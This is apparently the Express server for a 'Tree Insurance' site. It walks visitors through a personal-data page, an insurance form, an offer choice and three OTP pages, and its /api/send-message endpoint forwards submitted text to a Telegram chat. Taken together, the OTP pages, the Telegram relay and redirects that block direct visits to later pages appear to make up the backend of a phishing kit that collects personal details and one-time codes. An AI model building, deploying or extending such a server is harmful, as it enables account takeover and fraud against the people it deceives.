const express = require('express');
const cors = require('cors');
const dotenv = require('dotenv');
const path = require('path');
const crypto = require('crypto');

// Load environment variables
dotenv.config();

// Generate a secure session secret if not provided
const SESSION_SECRET = process.env.SESSION_SECRET || crypto.randomBytes(64).toString('hex');

const app = express();

// ============================================
// Session Configuration
// ============================================
const session = require('express-session');
app.use(session({
  secret: SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    maxAge: 30 * 60 * 1000, // 30 minutes
    sameSite: 'strict'
  }
}));

// ============================================
// Middleware
// ============================================
app.use(cors());
app.use(express.json());

// Parse URL-encoded bodies for form submissions
app.use(express.urlencoded({ extended: true }));

// Trust proxy (for secure cookies behind reverse proxy)
app.set('trust proxy', 1);

// Telegram configuration
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in environment.');
}

// ============================================
// Session Step Tracking Constants
// ============================================
const STEPS = {
  STEP1: 'step1_completed',    // index.html - Basic data submitted
  STEP2: 'step2_completed',    // form1.html - Insurance data submitted
  STEP3: 'step3_completed'    // totalselect.html - Offer selected
};

// Pages that require session step completion
const PROTECTED_PAGES = {
  'form1.html': STEPS.STEP1,
  'totalselect.html': STEPS.STEP2,
  'otp.html': STEPS.STEP2,
  'otp2.html': STEPS.STEP2,
  'otp3.html': STEPS.STEP2
};

// Pages that initialize a session step
const SESSION_INIT_PAGES = {
  'index.html': STEPS.STEP1
};

// ============================================
// Route Protection Middleware
// ============================================
const routeProtection = (req, res, next) => {
  const requestedPath = req.path;
  const pageName = path.basename(requestedPath);

  // Initialize session step if this page starts a step
  if (SESSION_INIT_PAGES[pageName]) {
    const stepToInit = SESSION_INIT_PAGES[pageName];
    if (!req.session.completedSteps) {
      req.session.completedSteps = {};
    }
    // Mark this step as initiated (for step 1, it's the start)
    req.session.completedSteps[stepToInit] = true;
    req.session._currentStep = stepToInit;
    req.session.lastActivity = Date.now();
    console.log(`[ROUTE] Session initialized for step: ${stepToInit}`);
  }

  // Check if page requires a previous step
  if (PROTECTED_PAGES[pageName]) {
    const requiredStep = PROTECTED_PAGES[pageName];
    
    // Check if the required step is completed
    if (!req.session.completedSteps || !req.session.completedSteps[requiredStep]) {
      console.log(`[ROUTE] Access denied to ${pageName}. Required step: ${requiredStep}, Session steps:`, req.session.completedSteps);
      
      // Log attempt for security monitoring
      console.warn(`[SECURITY] Unauthorized access attempt to ${pageName} from IP: ${req.ip}`);
      
      // Clear session data for security
      req.session.destroy((err) => {
        if (err) console.error('Session destroy error:', err);
      });
      
      // Redirect to index.html
      return res.redirect('/');
    }
    
    console.log(`[ROUTE] Access granted to ${pageName} for step: ${requiredStep}`);
    req.session.lastActivity = Date.now();
  }

  next();
};

// ============================================
// Session Management API Endpoints
// ============================================

// Complete a step and advance to next
app.post('/api/complete-step', (req, res) => {
  const { step, data } = req.body;
  
  if (!req.session.completedSteps) {
    req.session.completedSteps = {};
  }
  
  if (STEPS[step]) {
    req.session.completedSteps[STEPS[step]] = true;
    
    // Store any additional data for this step
    if (data) {
      if (!req.session.stepData) {
        req.session.stepData = {};
      }
      req.session.stepData[STEPS[step]] = data;
    }
    
    req.session.lastActivity = Date.now();
    console.log(`[SESSION] Step completed: ${STEPS[step]}`);
    
    res.json({ ok: true, message: 'Step completed', completedSteps: req.session.completedSteps });
  } else {
    res.status(400).json({ ok: false, error: 'Invalid step' });
  }
});

// Get current session status
app.get('/api/session-status', (req, res) => {
  res.json({
    completedSteps: req.session.completedSteps || {},
    lastActivity: req.session.lastActivity,
    isValid: req.session.completedSteps && Object.keys(req.session.completedSteps).length > 0
  });
});

// Reset session (for logout or restart)
app.post('/api/reset-session', (req, res) => {
  req.session.destroy((err) => {
    if (err) {
      console.error('Session reset error:', err);
      return res.status(500).json({ ok: false, error: 'Failed to reset session' });
    }
    res.json({ ok: true, message: 'Session reset successfully' });
  });
});

// ============================================
// Health Check Endpoint
// ============================================
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok',
    sessionActive: !!req.session.completedSteps,
    completedSteps: req.session.completedSteps || {}
  });
});

// ============================================
// Telegram API Endpoint
// ============================================
app.post('/api/send-message', async (req, res) => {
  const { text, parse_mode = 'Markdown' } = req.body;

  if (!text || typeof text !== 'string') {
    return res.status(400).json({ ok: false, error: 'Text is required.' });
  }

  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    return res.status(500).json({ ok: false, error: 'Server is not configured with Telegram credentials.' });
  }

  try {
    const response = await fetch(
      `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text,
          parse_mode,
        }),
      }
    );

    const data = await response.json();

    if (!response.ok || !data.ok) {
      return res.status(502).json({ ok: false, error: data.description || 'Telegram API error', details: data });
    }

    res.json({ ok: true, result: data.result });
  } catch (error) {
    console.error('Telegram send error:', error);
    res.status(500).json({ ok: false, error: 'Failed to send message.' });
  }
});

// ============================================
// Static Files with Route Protection
// ============================================

// Serve public files with route protection middleware
app.use(express.static(path.join(__dirname, 'public'), {
  index: false, // Disable default index file serving
  setHeaders: (res, filePath) => {
    // Set security headers
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate, proxy-revalidate');
    res.setHeader('Pragma', 'no-cache');
  }
}));

// ============================================
// Protected Routes (HTML Pages)
// ============================================

// Apply route protection to HTML pages
const protectedPages = ['form1.html', 'totalselect.html', 'otp.html', 'otp2.html', 'otp3.html'];

protectedPages.forEach(page => {
  app.get(`/${page}`, routeProtection, (req, res) => {
    res.sendFile(path.join(__dirname, 'public', page));
  });
});

// ============================================
// Step Initialization Route (index.html logic)
// ============================================
app.get('/', routeProtection, (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================
// Catch-all Route
// ============================================
app.get('*', (req, res) => {
  // For any other route, redirect to index if they have a valid session
  if (req.session.completedSteps && Object.keys(req.session.completedSteps).length > 0) {
    res.redirect('/');
  } else {
    res.redirect('/');
  }
});

// ============================================
// Server Start
// ============================================
const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log(`
╔═══════════════════════════════════════════════════════╗
║         Tree Insurance Server Started                 ║
╠═══════════════════════════════════════════════════════╣
║  URL: http://localhost:${port}                           ║
║  Session Secret: ${SESSION_SECRET.substring(0, 20)}...      ║
╠═══════════════════════════════════════════════════════╣
║  Route Protection: ENABLED                            ║
║  • form1.html       → Requires Step 1                ║
║  • totalselect.html → Requires Step 2                ║
║  • otp*.html        → Requires Step 2                ║
╚═══════════════════════════════════════════════════════╝
  `);
});
